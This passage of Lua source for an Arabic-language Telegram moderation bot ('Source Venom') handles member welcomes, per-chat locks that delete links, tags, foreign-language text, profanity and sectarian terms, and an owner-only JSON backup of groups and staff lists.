local Welcomes = Welcomes:gsub('firstname',('['..result.first_name_..']' or ''))
local Welcomes = Welcomes:gsub('username',('[@'..result.username_..']' or '[@venom_source]'))
Dev_Abs(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
end 
if DevAbs:get(Venom.."Abs:Lock:Welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
--     Source Venom     --
--      New User Add      --
elseif msg.content_.ID == "MessageChatAddMembers" then
if not DevAbs:get(Venom..'Abs:Lock:BotWelcome') then 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = Venom,offset_ = 0,limit_ = 1},function(extra,abbas,success) 
for i=0,#msg.content_.members_ do    
BotWelcome = msg.content_.members_[i].id_    
if BotWelcome and BotWelcome == tonumber(Venom) then 
if DevAbs:sismember(Venom..'Abs:Groups',msg.chat_id_) then BotText = "مفعله في السابق\n𖠧︙ارسل ↫ الاوامر واستمتع بالمميزيات" else BotText = "معطله يجب رفعي مشرف\n𖠧︙بعد ذلك يرجى ارسال امر ↫ تفعيل\n𖠧︙سيتم رفع الادمنيه والمنشئ تلقائيا" end 
if DevAbs:get(Venom.."Abs:Text:BotWelcome") then AbsText = DevAbs:get(Venom.."Abs:Text:BotWelcome") else AbsText = "𖠧︙مرحبا انا بوت اسمي "..NameBot.."\n𖠧︙حالة المجموعه ↫ "..BotText.."\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉" end 
if DevAbs:get(Venom.."Abs:Photo:BotWelcome") then AbsPhoto = DevAbs:get(Venom.."Abs:Photo:BotWelcome") elseif abbas.photos_[0] then AbsPhoto = abbas.photos_[0].sizes_[1].photo_.persistent_id_ else AbsPhoto = nil end 
if AbsPhoto ~= nil then
sendPhoto(msg.chat_id_,msg.id_,0,1,nil,AbsPhoto,AbsText)
else 
send(msg.chat_id_,msg.id_,AbsText)
end 
end   
end
end,nil)
end
if DevAbs:get(Venom..'Abs:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and Ban(msg.content_.members_[0].id_, msg.chat_id_) then
ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and BanAll(msg.content_.members_[0].id_) then
ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
if DevAbs:get(Venom.."Abs:Lock:Welcome"..msg.chat_id_) then
if DevAbs:get(Venom..'Abs:Groups:Welcomes'..msg.chat_id_) then
Welcomes = DevAbs:get(Venom..'Abs:Groups:Welcomes'..msg.chat_id_)
else
Welcomes = '• نورت حبي \n• firstname \n• username'
end
local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
local Welcomes = Welcomes:gsub('firstname',('['..msg.content_.members_[0].first_name_..']' or ''))
local Welcomes = Welcomes:gsub('username',('[@'..msg.content_.members_[0].username_..']' or '[@venom_source]'))
Dev_Abs(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
end
--     Source Venom     --
--        Contact         --
elseif msg.content_.ID == "MessageContact" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAbs:get(Venom..'Abs:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAbs:get(Venom..'Abs:Lock:Contact'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
--     Source Venom     --
--         Audio          --
elseif msg.content_.ID == "MessageAudio" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAbs:get(Venom..'Abs:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAbs:get(Venom..'Abs:Lock:Music'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAbs:get(Venom..'Abs:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAbs:get(Venom..'Abs:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(Venom..'Abs:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(Venom..'Abs:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(Venom..'Abs:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(Venom..'Abs:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source Venom     --
--         Voice          --
elseif msg.content_.ID == "MessageVoice" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAbs:get(Venom..'Abs:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAbs:get(Venom..'Abs:Lock:Voice'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAbs:get(Venom..'Abs:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAbs:get(Venom..'Abs:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(Venom..'Abs:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(Venom..'Abs:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(Venom..'Abs:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(Venom..'Abs:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source Venom     --
--        Location        --
elseif msg.content_.ID == "MessageLocation" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAbs:get(Venom..'Abs:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAbs:get(Venom..'Abs:Lock:Location'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAbs:get(Venom..'Abs:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAbs:get(Venom..'Abs:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(Venom..'Abs:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(Venom..'Abs:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(Venom..'Abs:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(Venom..'Abs:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source Venom     --
--         Video          --
elseif msg.content_.ID == "MessageVideo" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAbs:get(Venom..'Abs:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAbs:get(Venom..'Abs:Lock:Videos'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAbs:get(Venom..'Abs:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAbs:get(Venom..'Abs:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(Venom..'Abs:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(Venom..'Abs:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(Venom..'Abs:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(Venom..'Abs:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source Venom     --
--          Gif           --
elseif msg.content_.ID == "MessageAnimation" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevAbs:get(Venom..'Abs:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevAbs:get(Venom..'Abs:Lock:Gifs'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevAbs:get(Venom..'Abs:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAbs:get(Venom..'Abs:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevAbs:get(Venom..'Abs:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(Venom..'Abs:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevAbs:get(Venom..'Abs:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevAbs:get(Venom..'Abs:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
--     Source Venom     --
--         Text           --
elseif msg.content_.ID == "MessageText" then
if not VipMem(msg) then
Filters(msg,text)
if msg.forward_info_ then
if DevAbs:get(Venom..'Abs:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
if DevAbs:get(Venom..'Abs:Lock:Links'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevAbs:get(Venom..'Abs:Lock:Text'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.text_:match("@") then
if DevAbs:get(Venom..'Abs:Lock:Tags'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("#") then
if DevAbs:get(Venom..'Abs:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or text:match(".[Xx][Yy][Zz]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevAbs:get(Venom..'Abs:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("[\216-\219][\128-\191]") then
if DevAbs:get(Venom..'Abs:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_ then
local _nl, ctrl_chars = string.gsub(text, '%c', '')
local _nl, real_digits = string.gsub(text, '%d', '')
if not DevAbs:get(Venom..'Abs:Spam:Text'..msg.chat_id_) then
sens = 400
else
sens = tonumber(DevAbs:get(Venom..'Abs:Spam:Text'..msg.chat_id_))
end
if DevAbs:get(Venom..'Abs:Lock:Spam'..msg.chat_id_) and string.len(msg.content_.text_) > (sens) or ctrl_chars > (sens) or real_digits > (sens) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.text_:match("[A-Z]") or msg.content_.text_:match("[a-z]") then
if DevAbs:get(Venom..'Abs:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
--     Source Venom     --
if DevAbs:get(Venom.."Abs:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) then
if text == "الغاء" then
send(msg.chat_id_,msg.id_,"𖠧︙تم الغاء حفظ الرابط")       
DevAbs:del(Venom.."Abs:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
return false
end
if msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)") then
local Link = msg.content_.text_:match("(https://telegram.me/joinchat/%S+)") or msg.content_.text_:match("(https://t.me/joinchat/%S+)")
DevAbs:set(Venom.."Abs:Groups:Links"..msg.chat_id_,Link)
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم حفظ الرابط بنجاح', 1, 'md')
DevAbs:del(Venom.."Abs:Set:Groups:Links"..msg.chat_id_..msg.sender_user_id_) 
return false 
end
end
--     Source Venom     --
local msg = data.message_
text = msg.content_.text_
if text and Constructor(msg) then 
if DevAbs:get('VenomTEAM:'..Venom.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevAbs:del('VenomTEAM:'..Venom..'id:user'..msg.chat_id_)  
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم الغاء الامر', 1, 'md')
DevAbs:del('VenomTEAM:'..Venom.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevAbs:del('VenomTEAM:'..Venom.."numadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevAbs:get('VenomTEAM:'..Venom..'id:user'..msg.chat_id_)  
DevAbs:incrby(Venom..'Abs:UsersMsgs'..msg.chat_id_..':'..iduserr,numadded)
Dev_Abs(msg.chat_id_, msg.id_,  1, "𖠧︙تم اضافة "..numadded..' رساله', 1, 'md')
DevAbs:del('VenomTEAM:'..Venom..'id:user'..msg.chat_id_) 
end
end
if text and Constructor(msg) then 
if DevAbs:get('VenomTEAM:'..Venom.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
DevAbs:del('VenomTEAM:'..Venom..'ids:user'..msg.chat_id_)  
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم الغاء الامر', 1, 'md')
DevAbs:del('VenomTEAM:'..Venom.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevAbs:del('VenomTEAM:'..Venom.."nmadd:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local numadded = string.match(text, "(%d+)") 
local iduserr = DevAbs:get('VenomTEAM:'..Venom..'ids:user'..msg.chat_id_)  
DevAbs:incrby(Venom..'Abs:GamesNumber'..msg.chat_id_..iduserr,numadded)  
Dev_Abs(msg.chat_id_, msg.id_,  1, "𖠧︙تم اضافة "..numadded..' نقطه', 1, 'md')
DevAbs:del('VenomTEAM:'..Venom..'ids:user'..msg.chat_id_)  
end
end
--     Source Venom     --
if text and (text:match("طيز") or text:match("ديس") or text:match("انيج") or text:match("نيج") or text:match("ديوس") or text:match("عير") or text:match("كسختك") or text:match("كسمك") or text:match("كسربك") or text:match("بلاع") or text:match("ابو العيوره") or text:match("منيوج") or text:match("كحبه") or text:match("كحاب") or text:match("الكحبه") or text:match("كسك") or text:match("طيزك") or text:match("كس امك") or text:match("صرم") or text:match("كس اختك")) then
if not DevAbs:get(Venom.."Abs:Lock:Fshar"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","𖠧︙ممنوع الفشار في المجموعه")  
end end
if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
if DevAbs:get(Venom.."Abs:Lock:Farsi"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","𖠧︙ممنوع التكلم بالغه الفارسيه هنا")  
end end
if text and (text:match("ڬ") or text:match("ٺ") or text:match("چ") or text:match("ڇ") or text:match("ڿ") or text:match("ڀ") or text:match("ڎ") or text:match("ݫ") or text:match("ژ") or text:match("ڟ") or text:match("ݜ") or text:match("ڸ") or text:match("پ") or text:match("۴") or text:match("مک") or text:match("زدن") or text:match("دخترا") or text:match("دیوث") or text:match("کلیپشن") or text:match("خوششون") or text:match("میدا") or text:match("که") or text:match("بدانیم") or text:match("باید") or text:match("زناشویی") or text:match("آموزش") or text:match("راحتی") or text:match("خسته") or text:match("بیام") or text:match("بپوشم") or text:match("كرمه")) then
if DevAbs:get(Venom.."Abs:Lock:FarsiBan"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ChatKick(msg.chat_id_, msg.sender_user_id_)
end end 
if text and (text:match("خره بالله") or text:match("خبربك") or text:match("كسدينربك") or text:match("خرب بالله") or text:match("خرب الله") or text:match("خره بربك") or text:match("الله الكواد") or text:match("خره بمحمد") or text:match("كسم الله") or text:match("كسم ربك") or text:match("كسربك") or text:match("كسختالله") or text:match("كسخت الله") or text:match("خره بدينك") or text:match("خرهبدينك") or text:match("كسالله") or text:match("خربالله")) then
if not DevAbs:get(Venom.."Abs:Lock:Kfr"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","𖠧︙ممنوع الكفر في المجموعه") 
end end
if text and (text:match("سني نكس") or text:match("شيعه") or text:match("الشيعه") or text:match("السنه") or text:match("طائفتكم") or text:match("شيعي") or text:match("انا سني") or text:match("مسيحي") or text:match("يهودي") or text:match("صابئي") or text:match("ملحد") or text:match("بالسنه") or text:match("شيعة")) then
if not DevAbs:get(Venom.."Abs:Lock:Taf"..msg.chat_id_) and not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
ReplyStatus(msg,msg.sender_user_id_,"WrongWay","𖠧︙ممنوع التكلم بالطائفيه هنا") 
end end
--     Source Venom     --
if SecondSudo(msg) then
if text == 'جلب نسخه الكروبات' or text == 'جلب نسخه احتياطيه' or text == 'جلب النسخه الاحتياطيه' then
local List = DevAbs:smembers(Venom..'Abs:Groups') 
local BotName = (DevAbs:get(Venom.."Abs:NameBot") or 'ڤينوم')
local GetJson = '{"BotId": '..Venom..',"BotName": "'..BotName..'","GroupsList":{'  
for k,v in pairs(List) do 
LinkGroups = DevAbs:get(Venom.."Abs:Groups:Links"..v)
Welcomes = DevAbs:get(Venom..'Abs:Groups:Welcomes'..v) or ''
Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
AbsConstructors = DevAbs:smembers(Venom..'Abs:AbsConstructor:'..v)
Constructors = DevAbs:smembers(Venom..'Abs:BasicConstructor:'..v)
BasicConstructors = DevAbs:smembers(Venom..'Abs:Constructor:'..v)
Managers = DevAbs:smembers(Venom..'Abs:Managers:'..v)
Admis = DevAbs:smembers(Venom..'Abs:Admins:'..v)
Vips = DevAbs:smembers(Venom..'Abs:VipMem:'..v)
if k == 1 then
GetJson = GetJson..'"'..v..'":{'
else
GetJson = GetJson..',"'..v..'":{'
end
if #Vips ~= 0 then 
GetJson = GetJson..'"Vips":['
for k,v in pairs(Vips) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Admis ~= 0 then
GetJson = GetJson..'"Admis":['
for k,v in pairs(Admis) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Managers ~= 0 then
GetJson = GetJson..'"Managers":['
for k,v in pairs(Managers) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Constructors ~= 0 then
GetJson = GetJson..'"Constructors":['
for k,v in pairs(Constructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #BasicConstructors ~= 0 then
GetJson = GetJson..'"BasicConstructors":['
for k,v in pairs(BasicConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #AbsConstructors ~= 0 then
GetJson = GetJson..'"AbsConstructors":['
for k,v in pairs(AbsConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if LinkGroups then
GetJson = GetJson..'"LinkGroups":"'..LinkGroups..'",'
end
GetJson = GetJson..'"Welcomes":"'..Welcomes..'"}'
end
GetJson = GetJson..'}}'
local File = io.open('./'..Venom..'.json', "w")
File:write(GetJson)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './'..Venom..'.json', '𖠧︙يحتوي الملف على ↫ '..#List..' مجموعه',dl_cb, nil)
io.popen('rm -rf ./'..Venom..'.json')
end
